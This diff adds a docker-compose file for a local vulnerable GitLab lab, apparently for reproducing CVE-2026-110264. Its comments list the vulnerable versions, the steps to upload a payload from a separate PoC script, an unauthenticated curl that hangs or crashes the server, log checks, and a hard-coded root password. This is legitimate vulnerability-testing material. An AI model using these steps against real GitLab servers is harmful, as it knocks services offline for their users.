@@ -1,0 +1,38 @@
+# Full GitLab vulnerable lab (optional, heavy).
+# Official vulnerable image pattern (cf. Rapid7 analysis of sister CVE-2026-97229
+# on gitlab/gitlab-ce:19.4.1-ce.0). For CVE-2026-110264 use any build BEFORE the
+# 2026-10-21 patch, e.g. 19.4.2 / 19.3.5 / 19.2.8 (still vulnerable to 110264,
+# fixed only in 19.4.3 / 19.3.6 / 19.2.9 / 19.5.1).
+#
+#   docker run --detach --hostname gitlab.example --publish 8929:80 \
+#     --name gitlab-110264-vuln --shm-size 256m \
+#     gitlab/gitlab-ce:19.4.2-ce.0
+#   # wait ~5-10 min for `docker logs gitlab-110264-vuln` to show "gitlab Reconfigured!"
+#   # 1. Visit http://127.0.0.1:8929, set root password, sign in as root.
+#   # 2. New project `victim/pub` (Public visibility!), README initialised.
+#   # 3. Generate payload:  python3 ../poc.py payload --repeats 35000 -o p0.org
+#   # 4. Web UI -> "+" -> New file -> upload p0.org to `main` (or push via git).
+#   # 5. Unauthenticated trigger (no login, clean browser/incognito):
+#   #      curl -i 'http://127.0.0.1:8929/victim/pub/-/blob/main/p0.org'
+#   #    expect: multi-second hang then 200-after-Timeout or 502 (Workhorse).
+#   # 6. Server-side corroboration (docker exec):
+#   #      grep Timeout::Error /var/log/gitlab/gitlab-rails/exceptions_json.log | grep OtherMarkup
+#   #      grep -E '502|badgateway' /var/log/gitlab/gitlab-workhorse/current
+#   #      grep -B1 -A20 '\[BUG\]' /var/log/gitlab/puma/puma_stderr.log | grep -E 'org-ruby|headline|match_at|onig_'
+#   # 7. Patch test: upgrade to 19.4.3+ and re-run -> fast render / clean error.
+#
+# Resource warning: single-node GitLab needs ~8-9 GB free RAM for the 2 GiB
+# pcode path; low-memory hosts OOM-kill/SIGKILL the worker instead of crashing
+# (no [BUG] dump, only the 502 + Timeout burst remain -- still a valid oracle).
+version: "3.8"
+services:
+  gitlab-vuln:
+    image: gitlab/gitlab-ce:19.4.2-ce.0
+    hostname: gitlab.example
+    ports:
+      - "127.0.0.1:8929:80"
+    shm_size: 256m
+    environment:
+      GITLAB_OMNIBUS_CONFIG: |
+        external_url 'http://127.0.0.1:8929'
+        gitlab_rails['initial_root_password'] = 'RootPassword123!'
